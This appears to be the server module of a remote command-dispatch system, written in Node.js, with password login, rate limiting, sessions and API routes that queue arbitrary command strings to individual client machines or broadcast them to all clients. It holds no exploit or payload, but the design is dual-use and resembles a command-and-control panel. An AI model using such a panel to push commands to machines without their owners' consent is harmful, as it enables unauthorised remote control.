
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { timingSafeEqual } from 'node:crypto';
import { config } from './config.js';
import * as state from './state.js';
import * as session from './session.js';
import * as ratelimit from './ratelimit.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PUBLIC = path.join(__dirname, '..', 'public');

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
};

function sendJson(res, code, body) {
  const payload = JSON.stringify(body);
  res.writeHead(code, {
    'content-type': 'application/json; charset=utf-8',
    'content-length': Buffer.byteLength(payload),
    'cache-control': 'no-store',
  });
  res.end(payload);
}

function sendText(res, code, text, headers = {}) {
  res.writeHead(code, {
    'content-type': 'text/plain; charset=utf-8',
    'content-length': Buffer.byteLength(text),
    'cache-control': 'no-store',
    ...headers,
  });
  res.end(text);
}

function redirect(res, location, extra = {}) {
  res.writeHead(302, { location, 'cache-control': 'no-store', ...extra });
  res.end();
}

function readBody(req, limit = 8192) {
  return new Promise((resolve, reject) => {
    let size = 0;
    const chunks = [];
    req.on('data', (c) => {
      size += c.length;
      if (size > limit) {
        reject(new Error('too large'));
        req.destroy();
        return;
      }
      chunks.push(c);
    });
    req.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')));
    req.on('error', reject);
  });
}

async function parseJson(req) {
  try {
    return JSON.parse(await readBody(req));
  } catch {
    return null;
  }
}

function clientIp(req) {
  return req.socket.remoteAddress?.replace(/^::ffff:/, '') ?? 'unknown';
}

function safeEqual(a, b) {
  const A = Buffer.from(String(a));
  const B = Buffer.from(String(b));
  if (A.length !== B.length) return false;
  return timingSafeEqual(A, B);
}

function getSession(req) {
  const cookies = session.parseCookies(req.headers.cookie);
  return session.verify(cookies[config.cookieName]);
}

function limitOrReject(res, scope, ip, limit, windowMs) {
  const r = ratelimit.hit(scope, ip, limit, windowMs);
  if (r.ok) return true;
  const retry = Math.ceil(r.retryAfterMs / 1000);
  res.writeHead(429, {
    'content-type': 'text/plain; charset=utf-8',
    'retry-after': String(retry),
    'cache-control': 'no-store',
  });
  res.end('too many requests\n');
  return false;
}

function serveStatic(res, rel) {
  const file = path.join(PUBLIC, rel);
  if (!file.startsWith(PUBLIC)) return sendText(res, 403, 'forbidden\n');
  fs.readFile(file, (err, data) => {
    if (err) return sendText(res, 404, 'not found\n');
    const ext = path.extname(file);
    res.writeHead(200, {
      'content-type': MIME[ext] ?? 'application/octet-stream',
      'cache-control': rel === 'index.html' || rel === 'login.html' ? 'no-store' : 'no-cache',
    });
    res.end(data);
  });
}

// ---------- login ----------

function serveLogin(res) {
  serveStatic(res, 'login.html');
}

async function handleLogin(req, res) {
  const ip = clientIp(req);
  if (!limitOrReject(res, 'login', ip, 5, 5 * 60 * 1000)) return;

  let body = '';
  try {
    body = await readBody(req, 4096);
  } catch {
    return sendText(res, 400, 'bad request\n');
  }
  const params = new URLSearchParams(body);
  const user = params.get('user') ?? '';
  const pass = params.get('password') ?? '';

  const okUser = safeEqual(user, config.adminUser);
  const okPass = safeEqual(pass, config.adminPassword);

  if (!okUser || !okPass) {
    console.log(`[login] ${ip} failed`);
    return redirect(res, '/login?e=1');
  }

  ratelimit.reset('login', ip);
  const token = session.issue(user);
  console.log(`[login] ${ip} ok`);
  redirect(res, '/', { 'set-cookie': session.cookieHeader(token) });
}

function handleLogout(req, res) {
  redirect(res, '/login', { 'set-cookie': session.clearCookieHeader() });
}

// ---------- api ----------

async function handleQueue(req, res, ip) {
  if (!limitOrReject(res, 'queue', ip, 60, 60_000)) return;
  const body = await parseJson(req);
  const { ip: target, cmd } = body ?? {};
  if (typeof target !== 'string' || typeof cmd !== 'string' || !cmd.length || cmd.length > 4096) {
    return sendJson(res, 400, { error: 'ip and cmd required' });
  }
  const ok = state.enqueue(target, cmd);
  sendJson(res, ok ? 200 : 404, ok ? { queued: true } : { error: 'unknown client' });
}

async function handleQueueScope(req, res, ip) {
  if (!limitOrReject(res, 'queue-all', ip, 60, 60_000)) return;
  const body = await parseJson(req);
  const { scope, cmd } = body ?? {};
  if (!['all', 'online', 'offline'].includes(scope) || typeof cmd !== 'string' || !cmd.length || cmd.length > 4096) {
    return sendJson(res, 400, { error: 'scope (all|online|offline) and cmd required' });
  }
  const count = state.enqueueScope(scope, cmd);
  sendJson(res, 200, { queued: count });
}

async function handleCancel(req, res, ip) {
  if (!limitOrReject(res, 'queue-del', ip, 60, 60_000)) return;
  const body = await parseJson(req);
  const { ip: target, id } = body ?? {};
  if (typeof target !== 'string' || typeof id !== 'string') {
    return sendJson(res, 400, { error: 'ip and id required' });
  }
  const ok = state.cancel(target, id);
  sendJson(res, ok ? 200 : 404, ok ? { cancelled: true } : { error: 'not found' });
}

function handleClients(req, res, ip) {
  if (!limitOrReject(res, 'clients', ip, 120, 60_000)) return;
  sendJson(res, 200, state.list());
}

// ---------- router ----------

function onRequest(req, res) {
  const ip = clientIp(req);
  const url = new URL(req.url, 'http://localhost');
  const method = req.method ?? 'GET';
  const pathname = url.pathname;

  // public routes
  if (method === 'GET' && pathname === '/login') return serveLogin(res);
  if (method === 'POST' && pathname === '/login') return handleLogin(req, res);
  if (method === 'GET' && pathname === '/logout') return handleLogout(req, res);

  const sess = getSession(req);
  const authenticated = Boolean(sess);

  // html routes → redirect to login when unauthenticated
  if (!authenticated && method === 'GET' && (pathname === '/' || pathname.endsWith('.html'))) {
    return redirect(res, '/login');
  }

  // api routes → 401 json when unauthenticated
  if (!authenticated) {
    if (pathname === '/clients' || pathname === '/queue' || pathname === '/queue-all') {
      return sendJson(res, 401, { error: 'unauthorized' });
    }
    if (method === 'GET') return redirect(res, '/login');
    return sendText(res, 401, 'unauthorized\n');
  }

  // authenticated
  if (method === 'GET' && pathname === '/clients') return handleClients(req, res, ip);
  if (method === 'POST' && pathname === '/queue') return handleQueue(req, res, ip);
  if (method === 'POST' && pathname === '/queue-all') return handleQueueScope(req, res, ip);
  if (method === 'DELETE' && pathname === '/queue') return handleCancel(req, res, ip);

  if (method === 'GET') {
    const rel = pathname === '/' ? 'index.html' : pathname.slice(1);
    return serveStatic(res, rel);
  }

  sendJson(res, 405, { error: 'method not allowed' });
}

export function startHttpServer() {
  const server = http.createServer(onRequest);
  server.listen(config.httpPort, () => {
    console.log(`[http] listening on :${config.httpPort}`);
  });
  return server;
}